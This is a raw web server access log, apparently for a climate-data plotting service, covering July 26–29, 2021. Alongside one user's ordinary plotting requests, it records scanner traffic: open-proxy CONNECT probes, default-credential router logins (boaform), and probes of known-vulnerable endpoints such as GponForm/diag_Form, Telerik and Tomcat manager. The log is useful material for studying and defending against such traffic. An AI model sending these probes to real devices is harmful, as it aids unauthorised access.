173.208.236.114 - - [26/Jul/2021:23:27:01 +0000] "CONNECT icanhazip.com:443 HTTP/1.1" 405 178 "-" "Go-http-client/1.1"
162.142.125.40 - - [27/Jul/2021:00:15:34 +0000] "GET / HTTP/1.1" 200 0 "-" "-"
162.142.125.40 - - [27/Jul/2021:00:15:35 +0000] "GET / HTTP/1.1" 200 0 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
173.208.236.114 - - [27/Jul/2021:00:24:48 +0000] "CONNECT icanhazip.com:443 HTTP/1.1" 405 178 "-" "Go-http-client/1.1"
176.212.177.42 - - [27/Jul/2021:00:38:21 +0000] "GET / HTTP/1.1" 200 0 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
173.208.236.114 - - [27/Jul/2021:01:26:52 +0000] "CONNECT icanhazip.com:443 HTTP/1.1" 405 178 "-" "Go-http-client/1.1"
173.208.236.114 - - [27/Jul/2021:02:25:24 +0000] "CONNECT icanhazip.com:443 HTTP/1.1" 405 178 "-" "Go-http-client/1.1"
173.208.236.114 - - [27/Jul/2021:03:24:33 +0000] "CONNECT icanhazip.com:443 HTTP/1.1" 405 178 "-" "Go-http-client/1.1"
209.17.96.138 - - [27/Jul/2021:03:39:13 +0000] "GET / HTTP/1.0" 200 0 "-" "Mozilla/5.0 (compatible; Nimbostratus-Bot/v1.3.2; http://cloudsystemnetworks.com)"
173.208.236.114 - - [27/Jul/2021:04:24:29 +0000] "CONNECT icanhazip.com:443 HTTP/1.1" 405 178 "-" "Go-http-client/1.1"
173.208.236.114 - - [27/Jul/2021:05:24:38 +0000] "CONNECT icanhazip.com:443 HTTP/1.1" 405 178 "-" "Go-http-client/1.1"
209.141.47.35 - - [27/Jul/2021:06:13:37 +0000] "GET /config/getuser?index=0 HTTP/1.1" 404 232 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0"
173.208.236.114 - - [27/Jul/2021:06:24:50 +0000] "CONNECT icanhazip.com:443 HTTP/1.1" 405 178 "-" "Go-http-client/1.1"
173.208.236.114 - - [27/Jul/2021:07:24:13 +0000] "CONNECT icanhazip.com:443 HTTP/1.1" 405 178 "-" "Go-http-client/1.1"
46.174.191.30 - - [27/Jul/2021:07:26:19 +0000] "GET / HTTP/1.0" 200 0 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_0) AppleWebKit/534.30 (KHTML, like Gecko) Chrome/12.0.742.100 Safari/534.30"
173.208.236.114 - - [27/Jul/2021:08:24:01 +0000] "CONNECT icanhazip.com:443 HTTP/1.1" 405 178 "-" "Go-http-client/1.1"
94.183.213.187 - - [27/Jul/2021:08:34:16 +0000] "GET / HTTP/1.1" 200 0 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
173.208.236.114 - - [27/Jul/2021:09:20:00 +0000] "CONNECT icanhazip.com:443 HTTP/1.1" 405 178 "-" "Go-http-client/1.1"
104.140.188.58 - - [27/Jul/2021:09:29:20 +0000] "GET / HTTP/1.1" 200 0 "-" "https://gdnplus.com:Gather Analyze Provide."
173.208.236.114 - - [27/Jul/2021:10:20:00 +0000] "CONNECT icanhazip.com:443 HTTP/1.1" 405 178 "-" "Go-http-client/1.1"
78.108.177.53 - - [27/Jul/2021:10:40:01 +0000] "GET / HTTP/1.0" 200 0 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.95 Safari/537.36"
162.142.125.53 - - [27/Jul/2021:10:57:01 +0000] "GET / HTTP/1.1" 200 0 "-" "-"
162.142.125.53 - - [27/Jul/2021:10:57:01 +0000] "GET / HTTP/1.1" 200 0 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
209.141.32.217 - - [27/Jul/2021:11:08:49 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 405 178 "http://54.193.239.191:8080/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
173.208.236.114 - - [27/Jul/2021:11:20:03 +0000] "CONNECT icanhazip.com:443 HTTP/1.1" 405 178 "-" "Go-http-client/1.1"
87.228.14.126 - - [27/Jul/2021:11:34:00 +0000] "GET / HTTP/1.1" 200 0 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
179.108.144.118 - - [27/Jul/2021:12:13:23 +0000] "GET / HTTP/1.1" 200 0 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
173.208.236.114 - - [27/Jul/2021:12:19:50 +0000] "CONNECT icanhazip.com:443 HTTP/1.1" 405 178 "-" "Go-http-client/1.1"
173.208.236.114 - - [27/Jul/2021:13:22:07 +0000] "CONNECT icanhazip.com:443 HTTP/1.1" 405 178 "-" "Go-http-client/1.1"
209.141.32.217 - - [27/Jul/2021:13:37:22 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 405 178 "http://54.193.239.191:8080/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
186.33.111.223 - - [27/Jul/2021:13:40:19 +0000] "GET / HTTP/1.1" 200 0 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
89.248.165.52 - - [27/Jul/2021:13:51:48 +0000] "CONNECT hotmail-com.olc.protection.outlook.com:25 HTTP/1.1" 405 178 "-" "-"
173.208.236.114 - - [27/Jul/2021:14:21:56 +0000] "CONNECT icanhazip.com:443 HTTP/1.1" 405 178 "-" "Go-http-client/1.1"
89.248.165.52 - - [27/Jul/2021:15:21:37 +0000] "CONNECT 85.206.160.115:80 HTTP/1.1" 405 178 "-" "-"
173.208.236.114 - - [27/Jul/2021:15:22:17 +0000] "CONNECT icanhazip.com:443 HTTP/1.1" 405 178 "-" "Go-http-client/1.1"
104.140.188.54 - - [27/Jul/2021:15:45:13 +0000] "GET / HTTP/1.0" 200 0 "-" "https://gdnplus.com:Gather Analyze Provide."
173.208.236.114 - - [27/Jul/2021:16:22:43 +0000] "CONNECT icanhazip.com:443 HTTP/1.1" 405 178 "-" "Go-http-client/1.1"
61.0.28.237 - - [27/Jul/2021:16:34:20 +0000] "GET / HTTP/1.1" 200 0 "-" "-"
200.89.146.133 - - [27/Jul/2021:17:22:25 +0000] "GET / HTTP/1.1" 200 0 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
173.208.236.114 - - [27/Jul/2021:17:22:44 +0000] "CONNECT icanhazip.com:443 HTTP/1.1" 405 178 "-" "Go-http-client/1.1"
173.208.236.114 - - [27/Jul/2021:18:25:22 +0000] "CONNECT icanhazip.com:443 HTTP/1.1" 405 178 "-" "Go-http-client/1.1"
91.151.159.178 - - [27/Jul/2021:18:38:06 +0000] "GET / HTTP/1.1" 200 0 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
209.141.32.217 - - [27/Jul/2021:19:54:38 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 405 178 "http://54.193.239.191:8080/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
189.33.181.93 - - [27/Jul/2021:20:13:11 +0000] "GET / HTTP/1.1" 200 0 "-" "-"
189.126.195.138 - - [27/Jul/2021:20:36:47 +0000] "GET / HTTP/1.1" 200 0 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7"
209.17.96.138 - - [27/Jul/2021:20:44:08 +0000] "GET / HTTP/1.1" 200 0 "-" "Mozilla/5.0 (compatible; Nimbostratus-Bot/v1.3.2; http://cloudsystemnetworks.com)"
139.162.215.70 - - [27/Jul/2021:20:44:47 +0000] "GET / HTTP/1.1" 200 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
103.119.54.82 - - [27/Jul/2021:21:31:04 +0000] "GET / HTTP/1.1" 200 0 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7"
51.159.93.41 - - [27/Jul/2021:21:40:56 +0000] "GET / HTTP/1.1" 200 0 "-" "-"
147.182.190.164 - - [27/Jul/2021:21:50:11 +0000] "GET / HTTP/1.1" 200 0 "-" "-"
103.203.57.9 - - [27/Jul/2021:21:55:46 +0000] "GET / HTTP/1.1" 200 0 "-" "Mozilla/5.0"
147.182.190.164 - - [27/Jul/2021:22:00:39 +0000] "GET / HTTP/1.1" 200 0 "-" "-"
209.141.47.35 - - [27/Jul/2021:23:47:52 +0000] "GET /config/getuser?index=0 HTTP/1.1" 404 232 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0"
209.17.97.58 - - [28/Jul/2021:00:07:52 +0000] "GET / HTTP/1.0" 200 0 "-" "Mozilla/5.0 (compatible; Nimbostratus-Bot/v1.3.2; http://cloudsystemnetworks.com)"
59.99.42.87 - - [28/Jul/2021:00:36:33 +0000] "POST /GponForm/diag_Form?images/ HTTP/1.1" 405 178 "-" "Hello, World"
209.141.32.217 - - [28/Jul/2021:00:54:58 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 405 178 "http://54.193.239.191:8080/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
173.208.236.114 - - [28/Jul/2021:01:24:28 +0000] "CONNECT icanhazip.com:443 HTTP/1.1" 405 178 "-" "Go-http-client/1.1"
46.174.191.29 - - [28/Jul/2021:01:32:07 +0000] "GET / HTTP/1.0" 200 0 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_0) AppleWebKit/534.30 (KHTML, like Gecko) Chrome/12.0.742.100 Safari/534.30"
193.118.53.210 - - [28/Jul/2021:01:50:11 +0000] "GET /Telerik.Web.UI.WebResource.axd?type=rau HTTP/1.1" 404 232 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
106.54.78.68 - - [28/Jul/2021:01:52:33 +0000] "GET /login HTTP/1.0" 404 232 "-" "-"
106.54.78.68 - ncOArOqq [28/Jul/2021:01:52:33 +0000] "GET /manager/html/ HTTP/1.0" 404 232 "-" "-"
173.208.236.114 - - [28/Jul/2021:02:24:57 +0000] "CONNECT icanhazip.com:443 HTTP/1.1" 405 178 "-" "Go-http-client/1.1"
205.185.120.237 - - [28/Jul/2021:02:46:38 +0000] "GET /config/getuser?index=0 HTTP/1.1" 404 232 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0"
173.208.236.114 - - [28/Jul/2021:03:25:24 +0000] "CONNECT icanhazip.com:443 HTTP/1.1" 405 178 "-" "Go-http-client/1.1"
45.229.54.24 - - [28/Jul/2021:04:22:37 +0000] "GET /boaform/admin/formLogin?username=user&psd=user HTTP/1.0" 404 232 "-" "-"
173.208.236.114 - - [28/Jul/2021:04:23:25 +0000] "CONNECT icanhazip.com:443 HTTP/1.1" 405 178 "-" "Go-http-client/1.1"
185.189.182.234 - - [28/Jul/2021:04:47:00 +0000] "GET / HTTP/1.1" 200 0 "-" "-"
209.141.32.217 - - [28/Jul/2021:04:58:41 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 405 178 "http://54.193.239.191:8080/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
79.111.12.253 - - [28/Jul/2021:07:15:39 +0000] "CONNECT telegram.org:443 HTTP/1.0" 405 178 "-" "-"
78.108.177.51 - - [28/Jul/2021:07:36:13 +0000] "GET / HTTP/1.0" 200 0 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.95 Safari/537.36"
109.94.120.132 - - [28/Jul/2021:08:28:36 +0000] "GET / HTTP/1.1" 200 0 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
162.142.125.55 - - [28/Jul/2021:09:42:19 +0000] "GET / HTTP/1.1" 200 0 "-" "-"
162.142.125.55 - - [28/Jul/2021:09:42:19 +0000] "GET / HTTP/1.1" 200 0 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
173.208.236.114 - - [28/Jul/2021:10:21:39 +0000] "CONNECT icanhazip.com:443 HTTP/1.1" 405 178 "-" "Go-http-client/1.1"
173.208.236.114 - - [28/Jul/2021:11:21:50 +0000] "CONNECT icanhazip.com:443 HTTP/1.1" 405 178 "-" "Go-http-client/1.1"
209.141.32.217 - - [28/Jul/2021:11:23:43 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 405 178 "http://54.193.239.191:8080/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
128.14.209.162 - - [28/Jul/2021:11:49:01 +0000] "GET / HTTP/1.1" 200 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
173.208.236.114 - - [28/Jul/2021:12:18:18 +0000] "CONNECT icanhazip.com:443 HTTP/1.1" 405 178 "-" "Go-http-client/1.1"
173.208.236.114 - - [28/Jul/2021:13:19:10 +0000] "CONNECT icanhazip.com:443 HTTP/1.1" 405 178 "-" "Go-http-client/1.1"
209.141.32.217 - - [28/Jul/2021:13:30:06 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 405 178 "http://54.193.239.191:8080/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
173.208.236.114 - - [28/Jul/2021:14:18:21 +0000] "CONNECT icanhazip.com:443 HTTP/1.1" 405 178 "-" "Go-http-client/1.1"
173.208.236.114 - - [28/Jul/2021:15:19:26 +0000] "CONNECT icanhazip.com:443 HTTP/1.1" 405 178 "-" "Go-http-client/1.1"
185.6.119.184 - - [28/Jul/2021:15:33:56 +0000] "GET / HTTP/1.1" 200 0 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
173.208.236.114 - - [28/Jul/2021:16:28:47 +0000] "CONNECT icanhazip.com:443 HTTP/1.1" 405 178 "-" "Go-http-client/1.1"
64.62.197.92 - - [28/Jul/2021:16:35:12 +0000] "GET / HTTP/1.1" 200 0 "-" "-"
128.14.134.134 - - [28/Jul/2021:17:13:29 +0000] "GET / HTTP/1.1" 200 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
182.123.241.243 - - [28/Jul/2021:17:16:49 +0000] "GET /boaform/admin/formLogin?username=ec8&psd=ec8 HTTP/1.0" 404 232 "-" "-"
173.208.236.114 - - [28/Jul/2021:17:28:13 +0000] "CONNECT icanhazip.com:443 HTTP/1.1" 405 178 "-" "Go-http-client/1.1"
209.17.97.90 - - [28/Jul/2021:18:07:40 +0000] "GET / HTTP/1.0" 200 0 "-" "Mozilla/5.0 (compatible; Nimbostratus-Bot/v1.3.2; http://cloudsystemnetworks.com)"
173.208.236.114 - - [28/Jul/2021:18:29:10 +0000] "CONNECT icanhazip.com:443 HTTP/1.1" 405 178 "-" "Go-http-client/1.1"
197.214.114.90 - - [28/Jul/2021:19:00:14 +0000] "GET / HTTP/1.0" 200 0 "-" "masscan/1.3 (https://github.com/robertdavidgraham/masscan)"
209.141.32.217 - - [28/Jul/2021:19:14:13 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 405 178 "http://54.193.239.191:8080/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
61.242.40.158 - - [28/Jul/2021:19:20:53 +0000] "POST /GponForm/diag_Form?images/ HTTP/1.1" 405 178 "-" "Hello, World"
173.208.236.114 - - [28/Jul/2021:19:23:21 +0000] "CONNECT icanhazip.com:443 HTTP/1.1" 405 178 "-" "Go-http-client/1.1"
209.141.32.217 - - [28/Jul/2021:20:19:20 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 405 178 "http://54.193.239.191:8080/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
173.208.236.114 - - [28/Jul/2021:20:22:12 +0000] "CONNECT icanhazip.com:443 HTTP/1.1" 405 178 "-" "Go-http-client/1.1"
46.174.191.28 - - [28/Jul/2021:21:20:04 +0000] "GET / HTTP/1.0" 200 0 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_0) AppleWebKit/534.30 (KHTML, like Gecko) Chrome/12.0.742.100 Safari/534.30"
173.208.236.114 - - [28/Jul/2021:21:26:55 +0000] "CONNECT icanhazip.com:443 HTTP/1.1" 405 178 "-" "Go-http-client/1.1"
209.17.96.130 - - [28/Jul/2021:22:17:00 +0000] "GET / HTTP/1.1" 200 0 "-" "Mozilla/5.0 (compatible; Nimbostratus-Bot/v1.3.2; http://cloudsystemnetworks.com)"
173.208.236.114 - - [28/Jul/2021:22:26:50 +0000] "CONNECT icanhazip.com:443 HTTP/1.1" 405 178 "-" "Go-http-client/1.1"
68.251.58.43 - - [28/Jul/2021:22:50:58 +0000] "GET /cmda.html HTTP/1.1" 200 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
68.251.58.43 - - [28/Jul/2021:22:50:58 +0000] "GET /js2/chosen/chosen.css HTTP/1.1" 200 0 "http://54.193.239.191:8080/cmda.html" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
68.251.58.43 - - [28/Jul/2021:22:50:58 +0000] "GET /js2/bootstrap.min.css HTTP/1.1" 304 0 "http://54.193.239.191:8080/cmda.html" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
68.251.58.43 - - [28/Jul/2021:22:50:58 +0000] "GET /js2/mychosen.css HTTP/1.1" 200 0 "http://54.193.239.191:8080/cmda.html" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
68.251.58.43 - - [28/Jul/2021:22:50:58 +0000] "GET /js2/jquery.min.js HTTP/1.1" 200 0 "http://54.193.239.191:8080/cmda.html" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
68.251.58.43 - - [28/Jul/2021:22:50:58 +0000] "GET /js2/style_uploadr.css HTTP/1.1" 304 0 "http://54.193.239.191:8080/cmda.html" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
68.251.58.43 - - [28/Jul/2021:22:50:58 +0000] "GET /common.css HTTP/1.1" 304 0 "http://54.193.239.191:8080/cmda.html" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
68.251.58.43 - - [28/Jul/2021:22:50:58 +0000] "GET /js2/chosen/chosen.jquery.js HTTP/1.1" 200 0 "http://54.193.239.191:8080/cmda.html" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
68.251.58.43 - - [28/Jul/2021:22:50:58 +0000] "GET /js2/jq-ajax-progress.js HTTP/1.1" 200 0 "http://54.193.239.191:8080/cmda.html" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
68.251.58.43 - - [28/Jul/2021:22:50:58 +0000] "GET /js2/bootstrap.min.js HTTP/1.1" 200 0 "http://54.193.239.191:8080/cmda.html" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
68.251.58.43 - - [28/Jul/2021:22:50:58 +0000] "GET /js2/js.cookie-2.1.3.min.js HTTP/1.1" 200 0 "http://54.193.239.191:8080/cmda.html" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
68.251.58.43 - - [28/Jul/2021:22:50:59 +0000] "GET /js2/lodash.min.js HTTP/1.1" 200 0 "http://54.193.239.191:8080/cmda.html" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
68.251.58.43 - - [28/Jul/2021:22:50:59 +0000] "GET /js2/vue.js HTTP/1.1" 200 0 "http://54.193.239.191:8080/cmda.html" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
68.251.58.43 - - [28/Jul/2021:22:50:59 +0000] "GET /js2/varList.js HTTP/1.1" 200 0 "http://54.193.239.191:8080/cmda.html" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
68.251.58.43 - - [28/Jul/2021:22:50:59 +0000] "GET /js2/common-v6c.js?32 HTTP/1.1" 200 0 "http://54.193.239.191:8080/cmda.html" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
68.251.58.43 - - [28/Jul/2021:22:50:59 +0000] "GET /js2/uploadr.js HTTP/1.1" 200 0 "http://54.193.239.191:8080/cmda.html" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
68.251.58.43 - - [28/Jul/2021:22:50:59 +0000] "GET /js2/fileList.js?002a HTTP/1.1" 200 0 "http://54.193.239.191:8080/cmda.html" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
68.251.58.43 - - [28/Jul/2021:22:51:22 +0000] "GET /svc/universalPlotting6b?vars=SST&datasets=/mnt/data/data_clean/cmip5/others/coads_climatology.cdf&lonMethod=3&lonS=0&lonE=360&latMethod=3&latS=-90&latE=90&presMethod=0&presS=500&presE=800&timeMethod=1&timeS=2000-01-15&timeE=2000-12-15&ferretLevel=10&colorMap=rainbow&plotTitle=&anomaly=0&climatology=undefined&timeMean=&purpose=&service=plot&basin=&userId=&serviceId=&fromPage=http://54.193.239.191:8080/cmda.html HTTP/1.1" 200 2323 "http://54.193.239.191:8080/cmda.html" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
68.251.58.43 - - [28/Jul/2021:22:51:22 +0000] "GET /static/universalPlotting6b/dfe320bfc82e65ab86bf72512c8c951b/plot.png?1627512683299 HTTP/1.1" 200 0 "http://54.193.239.191:8080/cmda.html" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
68.251.58.43 - - [28/Jul/2021:23:09:12 +0000] "GET /svc/universalPlotting3b?var1=cl&model1=GFDL/ESM2G&lonMethod=3&latMethod=3&presMethod=1&timeMethod=1&lonS=0&lonE=360&latS=0&latE=90&presS=500&presE=800&timeS=20000115&timeE=20011215&anomaly=0&ferretLevel=10&colorMap=rainbow&plotTitle=&plotType=undefined&inputSource=3&varA=not%20yet%20picked&varB=%20&onlineFile=/home/svc/upload/coads_climatology.cdf&uploadFile=&uploadServerFile=&purpose=&userId=&serviceId=&fromPage=http://54.193.239.191:8080/universalPlotting3b.html HTTP/1.1" 200 3000 "http://54.193.239.191:8080/universalPlotting3b.html" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
68.251.58.43 - - [28/Jul/2021:23:09:13 +0000] "GET /static/universalPlotting3/5aa1d64e9106d242985368ebeef2e39b/plot.png?1627513753540 HTTP/1.1" 200 0 "http://54.193.239.191:8080/universalPlotting3b.html" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
68.251.58.43 - - [28/Jul/2021:23:09:22 +0000] "GET /correlationMap.html HTTP/1.1" 200 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
68.251.58.43 - - [28/Jul/2021:23:09:22 +0000] "GET /js2/dataList2.js HTTP/1.1" 200 0 "http://54.193.239.191:8080/correlationMap.html" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
68.251.58.43 - - [28/Jul/2021:23:09:22 +0000] "GET /js2/common-v4.js HTTP/1.1" 200 0 "http://54.193.239.191:8080/correlationMap.html" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
68.251.58.43 - - [28/Jul/2021:23:09:36 +0000] "GET /svc/correlationMap?model1=GFDL_ESM2G&var1=cct&pres1=-999999&model2=GFDL_ESM2G&var2=cct&pres2=-999999&purpose=&lonS=0&lonE=360&latS=-90&latE=90&timeS=200401&timeE=200412&laggedTime=0&fromPage=http://54.193.239.191:8080/correlationMap.html&userid=0 HTTP/1.1" 200 2789 "http://54.193.239.191:8080/correlationMap.html" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
68.251.58.43 - - [28/Jul/2021:23:09:36 +0000] "GET /static/correlationMap/d2de9c9a1da9aeb8f04ee3357cfd9e86/corrcoef.png HTTP/1.1" 200 0 "http://54.193.239.191:8080/correlationMap.html" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
173.208.236.114 - - [28/Jul/2021:23:27:00 +0000] "CONNECT icanhazip.com:443 HTTP/1.1" 405 178 "-" "Go-http-client/1.1"
183.136.225.14 - - [28/Jul/2021:23:52:11 +0000] "GET / HTTP/1.1" 200 0 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:47.0) Gecko/20100101 Firefox/47.0"
183.136.225.14 - - [28/Jul/2021:23:52:11 +0000] "GET / HTTP/1.1" 200 0 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36 QIHU 360SE"
183.136.225.14 - - [28/Jul/2021:23:52:12 +0000] "GET /favicon.ico HTTP/1.1" 404 232 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36 QIHU 360SE"
173.208.236.114 - - [29/Jul/2021:00:19:46 +0000] "CONNECT icanhazip.com:443 HTTP/1.1" 405 178 "-" "Go-http-client/1.1"
173.208.236.114 - - [29/Jul/2021:01:19:49 +0000] "CONNECT icanhazip.com:443 HTTP/1.1" 405 178 "-" "Go-http-client/1.1"
5.178.86.78 - - [29/Jul/2021:02:08:47 +0000] "CONNECT 91.201.52.66:80 HTTP/1.1" 405 178 "-" "-"
5.178.86.74 - - [29/Jul/2021:02:08:57 +0000] "POST http://freeze.na4u.ru/ip.php?Z77849768190Q1 HTTP/1.1" 405 178 "https://google.com/" "Mozilla/5.0 (Windows NT 6.1; rv:16.0) Gecko/20100101 Firefox/16.0"
173.208.236.114 - - [29/Jul/2021:02:21:56 +0000] "CONNECT icanhazip.com:443 HTTP/1.1" 405 178 "-" "Go-http-client/1.1"
192.241.205.120 - - [29/Jul/2021:02:40:16 +0000] "GET /actuator/health HTTP/1.1" 404 232 "-" "Mozilla/5.0 zgrab/0.x"
192.241.197.177 - - [29/Jul/2021:03:08:09 +0000] "GET /hudson HTTP/1.1" 404 232 "-" "Mozilla/5.0 zgrab/0.x"
